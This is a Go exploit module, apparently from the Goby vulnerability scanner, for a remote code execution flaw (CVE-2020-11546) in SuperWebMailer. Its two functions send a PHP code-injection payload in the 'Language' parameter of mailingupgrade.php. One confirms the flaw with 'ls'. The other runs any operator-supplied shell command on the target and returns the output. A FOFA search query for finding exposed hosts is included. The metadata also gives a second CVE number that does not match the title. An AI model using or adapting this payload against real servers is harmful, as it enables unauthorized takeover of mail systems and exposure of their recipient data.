package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SuperWebmailer RCE (CVE-2020-11546)",
    "Description": "<p>Superwebmailer is a web-based PHP communication software, used for communication recipient management, sending HTML newsletters, birthday emails.</p><p>The ‘Language’ parameter of the mailingupgrade.php file in SuperWebMailer 7.21.0.01526 version has an injection vulnerability. Attackers can use this vulnerability to execute arbitrary PHP code.</p>",
    "Impact": "SuperWebmailer RCE (CVE-2020-11546)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.superwebmailer.de/\">https://www.superwebmailer.de/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "SuperWebmailer",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "SuperWebmailer 代码执行漏洞 (CVE-2020-11546)",
            "Description": "<p>Superwebmailer是一个基于 Web 的 PHP 通讯软件，用于通讯收件人管理，发送 HTML 通讯，生日电子邮件。</p><p>SuperWebMailer 7.21.0.01526版本中的mailingupgrade.php文件的‘Language’参数存在注入漏洞。攻击者可利用该漏洞执行任意的PHP代码。</p>",
            "Impact": "<p>SuperWebMailer 7.21.0.01526版本中的mailingupgrade.php文件的‘Language’参数存在注入漏洞。攻击者可利用该漏洞执行任意的PHP代码。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.superwebmailer.de/\">https://www.superwebmailer.de/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "SuperWebmailer",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "SuperWebmailer RCE (CVE-2020-11546)",
            "Description": "<p>Superwebmailer is a web-based PHP communication software, used for communication recipient management, sending HTML newsletters, birthday emails.</p><p>The ‘Language’ parameter of the mailingupgrade.php file in SuperWebMailer 7.21.0.01526 version has an injection vulnerability. Attackers can use this vulnerability to execute arbitrary PHP code.</p>",
            "Impact": "SuperWebmailer RCE (CVE-2020-11546)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.superwebmailer.de/\">https://www.superwebmailer.de/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "SuperWebmailer",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "title=\"SuperWebMailer\"",
    "GobyQuery": "title=\"SuperWebMailer\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.superwebmailer.de/",
    "DisclosureDate": "2021-12-01",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2020-11546"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.0",
    "CVEIDs": [
        "CVE-2020-14065"
    ],
    "CNVD": [
        "CNVD-2020-46560"
    ],
    "CNNVD": [
        "CNNVD-202007-1116"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "ls",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "SuperWebmailer"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10248"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/mailingupgrade.php"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = `step=1&Language=de{${system("ls")}}&NextBtn=Weiter+%3E`
			if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "ajax_ccea.php") && strings.Contains(resp.RawBody, "ajax_getemailingactions.php")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri1 := "/mailingupgrade.php"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = fmt.Sprintf(`step=1&Language=de{${system("%s")}}&NextBtn=Weiter+%%3E`, cmd)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
